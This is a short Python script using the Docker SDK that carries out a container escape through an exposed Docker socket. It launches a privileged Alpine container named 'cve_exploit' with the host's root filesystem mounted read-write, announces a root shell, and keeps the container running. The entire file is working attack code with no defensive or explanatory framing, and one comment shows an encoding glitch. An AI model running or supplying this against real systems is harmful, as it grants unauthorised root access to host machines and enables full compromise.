import docker
import time

# Connect to the Docker daemon exposed via the shared Unix socket
client = docker.from_env()

# Launch a privileged Alpine container that bindâ€‘mounts the host root filesystem
container = client.containers.run(
    "alpine:3.11",
    command="sh",
    detach=True,
    tty=True,
    volumes={"/": {"bind": "/host", "mode": "rw"}},
    name="cve_exploit",
    privileged=True
)

print("Exploit container started with ID:", container.id)
print("If the host is vulnerable, you now have a root shell inside the container.")
# Keep the script alive so the container stays running for manual inspection
while True:
    time.sleep(60)
